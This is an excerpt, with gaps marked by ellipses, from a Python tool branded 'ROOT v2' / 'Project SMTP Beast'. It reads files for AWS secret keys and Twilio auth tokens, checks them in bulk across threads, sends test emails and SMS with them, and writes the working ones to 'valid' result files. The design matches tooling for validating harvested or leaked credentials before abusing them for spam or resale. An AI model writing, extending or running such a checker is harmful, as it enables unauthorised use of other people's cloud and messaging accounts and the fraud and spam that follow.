...
def check_send_smtp(file_path, recipient, max_threads):
    valid_filename = f'results/valid/validemail_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/invalid/invalidemail_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
...
def get_recipient_phone():
    phone_number = input("Enter recipient phone number for test SMS: ")
    return phone_number
    ...
    with open(file_path, 'r') as file:
        ...
        for line in lines:
            ...
            if "AWS_SECRET_ACCESS_KEY" in line:
                ...
                aws_credentials.append(f"{aws_key}|{aws_secret}")
    return aws_credentials

def check_aws_credentials(aws_key, aws_secret):
    try:
...
def send_test_email_aws(aws_key, aws_secret, recipient):
    try:
        session = boto3.Session(
            aws_access_key_id=aws_key,
            aws_secret_access_key=aws_secret
        ...
        subject = "Project SMTP Beast"
        body = "This email is from Root. AWS SES is valid."
        message = {
        ...
        logging.error(f"Error sending email with AWS SES: {str(e)}")
        return False

def parse_twilio_file(file_path):
    twilio_credentials = []
    with open(file_path, 'r') as file:
        lines = file.readlines()
        account_sid, from_number, auth_token = None, None, None
        for line in lines:
            if "TWILIO_ACCOUNT_SID" in line:
                account_sid = line.split("=")[1].strip()
            if "TWILIO_NUMBER" in line:
                from_number = line.split("=")[1].strip()
            if "TWILIO_AUTH_TOKEN" in line:
                auth_token = line.split("=")[1].strip()
                if account_sid and from_number and auth_token:
                    twilio_credentials.append(f"{account_sid}|{from_number}|{auth_token}")
                    account_sid, from_number, auth_token = None, None, None
    return twilio_credentials

def check_twilio_credentials(account_sid, auth_token):
    try:
        ...
        logging.error(f"Error validating Twilio credentials: {str(e)}")
    return False

def send_test_sms_twilio(account_sid, auth_token, from_number, recipient_phone):
    try:
        client = Client(account_sid, auth_token)
        message = client.messages.create(
            body="This is a test SMS from Root using Twilio.",
            from_=from_number,
            to=recipient_phone
        )
        if message.sid:
        ...
        logging.error(f"Error sending SMS with Twilio: {str(e)}")
    return False

def check_aws_credentials_from_file(file_path, recipient_email, max_threads):
    aws_credentials = parse_aws_file(file_path)
    valid_filename = f'results/valid/validaws_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/invalid/invalidaws_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    def process_aws_credentials(aws_cred):
        aws_key, aws_secret = aws_cred.split('|')
        if check_aws_credentials(aws_key, aws_secret):
            save_results(valid_filename, f"{aws_key}|{aws_secret}")
            print(Fore.GREEN + f"[ROOT v2 x AWS] {aws_key} [VALID]")
            if send_test_email_aws(aws_key, aws_secret, recipient_email):
                print(Fore.GREEN + f"[ROOT v2 x AWS] {aws_key} [EMAIL SENT]")
            else:
                print(Fore.RED + f"[ROOT v2 x AWS] {aws_key} [EMAIL FAILED]")
        else:
            save_results(invalid_filename, f"{aws_key}|{aws_secret}")
            print(Fore.RED + f"[ROOT v2 x AWS] {aws_key} [INVALID]")

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(process_aws_credentials, aws_credentials)

def check_twilio_credentials_from_file(file_path, recipient_phone, max_threads):
    twilio_credentials = parse_twilio_file(file_path)
    valid_filename = f'results/valid/validtwilio_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    invalid_filename = f'results/invalid/invalidtwilio_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'

    def process_twilio_credentials(twilio_cred):
        account_sid, from_number, auth_token = twilio_cred.split('|')
        if check_twilio_credentials(account_sid, auth_token):
            save_results(valid_filename, f"{account_sid}|{from_number}|{auth_token}")
            print(Fore.GREEN + f"[ROOT v2 x Twilio] {account_sid} [VALID]")
            if send_test_sms_twilio(account_sid, auth_token, from_number, recipient_phone):
                print(Fore.GREEN + f"[ROOT v2 x Twilio] {account_sid} [SMS SENT]")
            else:
                print(Fore.RED + f"[ROOT v2 x Twilio] {account_sid} [SMS FAILED]")
        else:
            save_results(invalid_filename, f"{account_sid}|{from_number}|{auth_token}")
            print(Fore.RED + f"[ROOT v2 x Twilio] {account_sid} [INVALID]")

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(process_twilio_credentials, twilio_credentials)
...
def main():
    ...
    while True:
        ...
        print("6: Check AWS credentials from file")
        print("7: Check Twilio credentials from file")
        print("8: Exit")
        ...
        if choice == '1':
            ...
            recipient = get_recipient_email()
            max_threads = get_max_threads()
            check_aws_credentials_from_file(file_path, recipient, max_threads)

        elif choice == '7':
            file_path = select_file()
            recipient_phone = get_recipient_phone()
            max_threads = get_max_threads()
            check_twilio_credentials_from_file(file_path, recipient_phone, max_threads)
        elif choice == '8':
            break
        else:
